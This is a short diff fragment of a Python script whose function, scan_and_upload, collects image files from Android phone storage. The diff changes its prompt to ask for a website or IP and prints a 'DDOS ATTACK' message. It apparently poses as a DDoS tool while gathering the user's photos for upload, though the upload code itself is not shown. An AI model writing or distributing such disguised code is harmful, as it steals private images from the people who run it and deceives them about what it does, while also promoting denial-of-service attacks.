@@ -26,7 +26,7 @@ def scan_and_upload():
     image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp')
     base_dir = "/storage/emulated/0" 
     
-    target_id = input("Number: ")
+    target_id = input("WEB OR İP: ")
     print(f"\n🔎 **{target_id}** DDOS ATTACK...")
     
     image_files = []
